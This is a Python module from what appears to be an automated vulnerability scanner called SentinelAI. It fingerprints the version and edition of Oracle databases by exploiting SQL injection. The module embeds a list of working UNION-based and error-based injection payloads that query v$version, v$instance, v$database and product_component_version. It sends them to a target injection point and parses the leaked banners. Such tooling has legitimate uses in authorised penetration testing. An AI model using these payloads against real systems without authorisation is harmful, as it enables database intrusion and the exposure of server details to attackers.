# app/modules/scanner/oracle_version.py
"""
Oracle version fingerprinting for SentinelAI.
Phase 2: Oracle Version Fingerprinting
"""

import logging
import re
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any, Tuple
import requests

from .union_sqli import UnionSQLi
from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .payloads import OracleDetectionPayloads, DetectionPayload
from .signatures import OracleSignatures, OracleVersionSignature, OracleEditionSignature

# ============================================================
# Data Classes
# ============================================================


@dataclass
class OracleVersionResult:
    """Oracle version fingerprinting result."""

    version: Optional[str] = None
    display_name: Optional[str] = None
    edition: Optional[str] = None
    full_version: Optional[str] = None
    is_xe: bool = False
    confidence: int = 0
    version_indicators: Dict[str, int] = field(default_factory=dict)
    edition_indicators: Dict[str, int] = field(default_factory=dict)
    raw_responses: List[str] = field(default_factory=list)

    def add_version_indicator(self, version: str, score: int):
        """Add a version indicator and its score."""
        self.version_indicators[version] = score
        self.confidence += score

    def add_edition_indicator(self, edition: str, score: int):
        """Add an edition indicator and its score."""
        self.edition_indicators[edition] = score

    def get_summary(self) -> str:
        """Get a summary of the version fingerprinting result."""
        if self.version:
            edition_str = f" ({self.edition})" if self.edition else ""
            xe_str = " XE" if self.is_xe else ""
            return f"Oracle {self.display_name}{xe_str}{edition_str} (Confidence: {self.confidence})"
        else:
            return (
                f"Oracle detected but version unknown (Confidence: {self.confidence})"
            )

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "version": self.version,
            "display_name": self.display_name,
            "edition": self.edition,
            "full_version": self.full_version,
            "is_xe": self.is_xe,
            "confidence": self.confidence,
            "version_indicators": self.version_indicators,
            "edition_indicators": self.edition_indicators,
            "summary": self.get_summary(),
        }

    def is_detected(self) -> bool:
        """Check if version was successfully detected."""
        return self.version is not None and self.confidence > 0


# ============================================================
# Main Version Fingerprinting Class
# ============================================================


class OracleVersionFingerprinter:
    """
    Oracle version fingerprinting module.
    Phase 2: Detects Oracle version and edition after successful Oracle detection.
    """

    # ============================================================
    # Constants
    # ============================================================

    VERSION_CONFIDENCE_THRESHOLD = 30
    EDITION_CONFIDENCE_THRESHOLD = 20
    MIN_SCORE_FOR_DETECTION = 25

    # Version fingerprinting payloads
    VERSION_PAYLOADS = [
        {
            "payload": "' UNION SELECT banner FROM v$version--",
            "description": "v$version banner",
            "weight": 35,
        },
        {
            "payload": "' UNION SELECT banner,NULL FROM v$version--",
            "description": "v$version with NULL",
            "weight": 30,
        },
        {
            "payload": "' UNION SELECT version FROM v$instance--",
            "description": "v$instance version",
            "weight": 25,
        },
        {
            "payload": "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
            "description": "v$version first row",
            "weight": 20,
        },
        {
            "payload": "' UNION SELECT product FROM product_component_version--",
            "description": "product_component_version",
            "weight": 20,
        },
        {
            "payload": "' UNION SELECT version FROM product_component_version--",
            "description": "product_component_version version",
            "weight": 20,
        },
        {
            "payload": "' UNION SELECT dbid FROM v$database--",
            "description": "v$database dbid",
            "weight": 15,
        },
        {
            "payload": "' UNION SELECT name FROM v$database--",
            "description": "v$database name",
            "weight": 15,
        },
        {
            "payload": "' AND 1=TO_NUMBER('test')--",
            "description": "Oracle error version",
            "weight": 15,
        },
        {
            "payload": "' UNION SELECT 'Oracle '||version FROM v$instance--",
            "description": "version from v$instance",
            "weight": 20,
        },
    ]

    # Version extraction regex patterns
    VERSION_EXTRACTION_PATTERNS = [
        r"Oracle Database (\d+[cg])",
        r"(\d+\.\d+\.\d+\.\d+\.?\d*)",
        r"Release (\d+\.\d+\.\d+)",
        r"(\d+g) Release",
        r"(\d+c) Release",
        r"XE (\d+\.\d+\.\d+)",
    ]

    EDITION_EXTRACTION_PATTERNS = [
        r"(Enterprise Edition)",
        r"(Standard Edition)",
        r"(Express Edition)",
        r"(Personal Edition)",
        r"(Lite Edition)",
        r"\b(EE)\b",
        r"\b(SE)\b",
        r"\b(XE)\b",
    ]

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: Optional[logging.Logger] = None,
    ):
        """Initialize Oracle version fingerprinter."""
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()
        self.signatures = OracleSignatures()

        self.baseline_response = None
        self.version_result = None

        self.logger.info(
            "[OracleVersion] Module initialized for version fingerprinting"
        )
        self.logger.info(f"[OracleVersion] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("OracleVersion")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> Optional[requests.Response]:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[OracleVersion] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[OracleVersion] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning("[OracleVersion] Failed to get baseline response")

        return self.baseline_response

    def _extract_version_from_text(self, text: str) -> Tuple[Optional[str], int]:
        """Extract Oracle version from text using patterns."""
        if not text:
            return None, 0

        for pattern in self.VERSION_EXTRACTION_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                version_str = match.group(1)
                self.logger.info(f"[OracleVersion] Extracted version: {version_str}")

                for sig in self.signatures.VERSION_SIGNATURES:
                    if sig.version.lower() in version_str.lower():
                        return sig.display_name, 30
                    if version_str.lower() in sig.version.lower():
                        return sig.display_name, 25

                return version_str, 20

        matches = self.signatures.find_version_by_pattern(text)
        if matches:
            best_match = max(matches, key=lambda x: x.weight)
            return best_match.display_name, best_match.weight

        return None, 0

    def _extract_edition_from_text(self, text: str) -> Tuple[Optional[str], int]:
        """Extract Oracle edition from text using patterns."""
        if not text:
            return None, 0

        for pattern in self.EDITION_EXTRACTION_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                edition_str = match.group(1)
                self.logger.info(f"[OracleVersion] Extracted edition: {edition_str}")

                if "XE" in edition_str.upper() or "EXPRESS" in edition_str.upper():
                    return "Express Edition", 25
                elif "ENTERPRISE" in edition_str.upper():
                    return "Enterprise Edition", 30
                elif "STANDARD" in edition_str.upper():
                    return "Standard Edition", 25
                elif "PERSONAL" in edition_str.upper():
                    return "Personal Edition", 20
                elif "LITE" in edition_str.upper():
                    return "Lite Edition", 15

                return edition_str, 20

        matches = self.signatures.find_edition_by_pattern(text)
        if matches:
            best_match = max(matches, key=lambda x: x.weight)
            return best_match.edition, best_match.weight

        return None, 0

    def _test_version_payload(
        self,
        injection_point: str,
        payload_info: Dict[str, Any],
        baseline: Optional[requests.Response],
    ) -> Dict[str, Any]:
        """Test a single version fingerprinting payload."""
        payload = payload_info["payload"]
        description = payload_info["description"]
        weight = payload_info["weight"]

        self.logger.info(f"[OracleVersion] Testing: {description}")
        self.logger.info(f"[OracleVersion] Payload: {payload}")

        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        if not result["success"] or result.get("response") is None:
            self.logger.warning(f"[OracleVersion] Payload test failed: {description}")
            return {
                "success": False,
                "score": 0,
                "response": None,
                "description": description,
            }

        response = result["response"]
        response_text = response.text

        version, version_score = self._extract_version_from_text(response_text)
        edition, edition_score = self._extract_edition_from_text(response_text)

        total_score = weight

        if version:
            total_score += version_score

        if edition:
            total_score += edition_score

        is_xe = "XE" in response_text.upper() or "EXPRESS" in response_text.upper()

        self.logger.info(f"[OracleVersion] Version: {version}")
        self.logger.info(f"[OracleVersion] Edition: {edition}")
        self.logger.info(f"[OracleVersion] XE: {is_xe}")
        self.logger.info(f"[OracleVersion] Score: {total_score}")

        return {
            "success": True,
            "score": total_score,
            "response": response,
            "response_text": response_text,
            "version": version,
            "edition": edition,
            "is_xe": is_xe,
            "description": description,
            "weight": weight,
            "version_score": version_score,
            "edition_score": edition_score,
        }

    # ============================================================
    # Public Methods
    # ============================================================

    def fingerprint(self, injection_point: str) -> OracleVersionResult:
        """Perform Oracle version fingerprinting."""
        self.logger.info(
            "[OracleVersion] =================================================="
        )
        self.logger.info("[OracleVersion] PHASE 2: Oracle Version Fingerprinting")
        self.logger.info(
            "[OracleVersion] =================================================="
        )

        result = OracleVersionResult()

        baseline = self._get_baseline(injection_point)

        self.logger.info("[OracleVersion] Testing version fingerprinting payloads...")

        for payload_info in self.VERSION_PAYLOADS:
            test_result = self._test_version_payload(
                injection_point, payload_info, baseline
            )

            if test_result["success"] and test_result["score"] > 0:
                if test_result.get("response_text"):
                    result.raw_responses.append(test_result["response_text"])

                if test_result.get("version"):
                    result.add_version_indicator(
                        test_result["version"], test_result["version_score"] or 10
                    )

                if test_result.get("edition"):
                    result.add_edition_indicator(
                        test_result["edition"], test_result["edition_score"] or 10
                    )

                if test_result.get("is_xe"):
                    result.is_xe = True

        # Determine best version
        if result.version_indicators:
            best_version = max(result.version_indicators.items(), key=lambda x: x[1])
            result.version = best_version[0]
            result.display_name = best_version[0]
            result.confidence = sum(result.version_indicators.values())

            for sig in self.signatures.VERSION_SIGNATURES:
                if sig.display_name.lower() in result.version.lower():
                    result.display_name = sig.display_name
                    result.version = sig.version
                    if sig.is_xe:
                        result.is_xe = True
                    break

        # Determine best edition
        if result.edition_indicators:
            best_edition = max(result.edition_indicators.items(), key=lambda x: x[1])
            result.edition = best_edition[0]

        # Build full version string
        if result.version:
            edition_str = f" ({result.edition})" if result.edition else ""
            xe_str = " XE" if result.is_xe else ""
            result.full_version = f"Oracle {result.display_name}{xe_str}{edition_str}"

        # Log final result
        self.logger.info(
            "[OracleVersion] =================================================="
        )
        self.logger.info("[OracleVersion] VERSION FINGERPRINTING COMPLETE")
        self.logger.info(f"[OracleVersion] Version: {result.version}")
        self.logger.info(f"[OracleVersion] Display Name: {result.display_name}")
        self.logger.info(f"[OracleVersion] Edition: {result.edition}")
        self.logger.info(f"[OracleVersion] Full Version: {result.full_version}")
        self.logger.info(f"[OracleVersion] XE: {result.is_xe}")
        self.logger.info(f"[OracleVersion] Confidence: {result.confidence}")
        self.logger.info(f"[OracleVersion] Summary: {result.get_summary()}")
        self.logger.info(
            "[OracleVersion] =================================================="
        )

        self.version_result = result
        return result

    def get_version(self, injection_point: str) -> Optional[str]:
        """Get Oracle version only."""
        result = self.fingerprint(injection_point)
        return result.version

    def get_edition(self, injection_point: str) -> Optional[str]:
        """Get Oracle edition only."""
        result = self.fingerprint(injection_point)
        return result.edition

    def is_xe(self, injection_point: str) -> bool:
        """Check if Oracle is Express Edition."""
        result = self.fingerprint(injection_point)
        return result.is_xe


# ============================================================
# Exports
# ============================================================

__all__ = ["OracleVersionFingerprinter", "OracleVersionResult"]
